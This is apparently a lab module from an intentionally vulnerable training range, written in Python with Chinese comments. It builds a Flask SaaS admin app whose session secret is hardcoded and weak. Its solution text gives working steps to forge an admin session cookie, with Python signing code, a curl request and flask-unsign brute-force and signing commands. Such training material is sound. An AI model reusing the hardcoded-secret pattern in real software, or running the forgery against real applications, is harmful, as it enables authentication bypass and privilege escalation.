"""SaaS 订阅后台的会话伪造。

业务场景是"订阅制 SaaS 的后台"：登录之后，套餐和权限都存在**客户端的
session cookie** 里。签名的密钥硬编码在源码里 —— 拿到密钥就能自己签一张。

这道题是 Python 栈特有的：Flask 的默认 session 是「把数据放在 cookie 里 + 签名」，
数据本身只是 base64，不是加密的。很多人以为「签名了 = 用户改不了」。
"""

from vuln4all import Vuln, redirect, render_template, request, session, url_for

#: 洞：密钥硬编码，而且弱得一眼能看出来。
#: 真实项目里这一行经常是 `app.secret_key = "changeme"` 或者从没改过的模板值。
WEAK_SECRET = "vuln4all-demo-secret"

USERS = {
    "alice": ("alice123", "free", False),
    "bob": ("bob123", "team", False),
}


class ForgedCookie(Vuln):
    info = {
        "name": "会话 cookie 伪造（Flask session 签名）",
        "author": ["guaidao2"],
        "cwe": "CWE-565",
        "owasp": "A07:2021 - Identification and Authentication Failures",
        "difficulty": "进阶",
        "description": (
            "套餐和权限都存在客户端的 session cookie 里。cookie 是签过名的，"
            "但签名用的密钥硬编码在源码里 —— 拿到密钥就能自己签一张「我是管理员」的。"
            "**签名≠加密**：数据本身只是 base64，谁都能读。"
        ),
        "hint": (
            "登录之后，页面会把你 cookie 的原始值和解码后的内容都打出来。"
            "先看一眼：里面的数据是加密的，还是只是编码的？\n"
            "然后去找签名用的密钥。这是个开源靶场，代码就在你眼前。\n"
            "最后一步：用那个密钥，按 Flask 的格式自己签一张内容不同的 cookie。"
        ),
        "solution": (
            "一、先看清 cookie 长什么样。它由三段用 . 分开：\n"
            "     <base64 数据>.<时间戳>.<签名>\n"
            "   把第一段 base64 解开会看到明文的 JSON —— 所以数据不是加密的。\n\n"
            "二、密钥在 module.py 里：WEAK_SECRET = \"vuln4all-demo-secret\"\n\n"
            "三、用 Flask 自己的机制签一张新的（不用装任何额外依赖）：\n\n"
            "   from flask import Flask\n"
            "   from flask.sessions import SecureCookieSessionInterface\n\n"
            "   app = Flask(__name__)\n"
            "   app.secret_key = \"vuln4all-demo-secret\"\n"
            "   signer = SecureCookieSessionInterface().get_signing_serializer(app)\n"
            "   print(signer.dumps({\"user\": \"mallory\", \"plan\": \"enterprise\", \"admin\": True}))\n\n"
            "四、把打印出来的值塞进浏览器：\n"
            "   打开开发者工具 → Application → Cookies → 把 session 的值替换掉 → 刷新。\n"
            "   或者用 curl：\n"
            "   curl -b 'session=<你签出来的值>' '<主入口>/admin'\n\n"
            "真实渗透里更省事的是 flask-unsign：\n"
            "   pipx install flask-unsign\n"
            "   flask-unsign --decode --cookie '<原 cookie>'          # 无密钥先看内容\n"
            "   flask-unsign --unsign --cookie '<原 cookie>' --wordlist secrets.txt\n"
            "   flask-unsign --sign --cookie '{\"admin\": true}' --secret '...'"
        ),
        "refs": [
            "https://flask.palletsprojects.com/en/stable/api/#sessions",
            "https://blog.paradoxis.nl/defeating-flasks-sessions-in-6-lines-of-code-53034e2921b",
        ],
    }

    # ---------------------------------------------------------------- 应用

    def create_app(self, ctx):
        app = ctx.flask(__name__)
        # ↓↓↓ 洞就在这里：硬编码的弱密钥。谁读得到源码，谁就能签 cookie ↓↓↓
        app.secret_key = WEAK_SECRET
        # ↑↑↑ 正确做法：从环境变量/密钥管理服务读取，用 secrets.token_hex(32) 生成，
        #     并且定期轮换；权限判定也不该只依赖客户端可读的数据 ↑↑↑

        @app.route("/")
        def index():
            if session.get("user"):
                return redirect(url_for("dashboard"))
            return render_template("login.html", error=None)

        @app.route("/login", methods=["POST"])
        def login():
            user = request.form.get("user", "")
            password = request.form.get("password", "")
            record = USERS.get(user)
            if record and record[0] == password:
                session["user"] = user
                session["plan"] = record[1]
                session["admin"] = record[2]
                return redirect(url_for("dashboard"))
            return render_template("login.html", error="用户名或密码不对")

        @app.route("/dashboard")
        def dashboard():
            if not session.get("user"):
                return redirect(url_for("index"))
            return render_template(
                "dashboard.html",
                data=dict(session),
                raw=request.cookies.get(app.config["SESSION_COOKIE_NAME"], ""),
                admin=bool(session.get("admin")),
                is_enterprise=session.get("plan") == "enterprise",
                cookie_name=app.config["SESSION_COOKIE_NAME"],
            )

        @app.route("/admin")
        def admin():
            if not session.get("admin"):
                return (
                    render_template(
                        "admin.html",
                        denied=True,
                        data=dict(session),
                        raw=request.cookies.get(app.config["SESSION_COOKIE_NAME"], ""),
                    ),
                    403,
                )
            return render_template(
                "admin.html", denied=False, data=dict(session), raw=""
            )

        @app.route("/logout")
        def logout():
            session.clear()
            return redirect(url_for("index"))

        return {"": app}
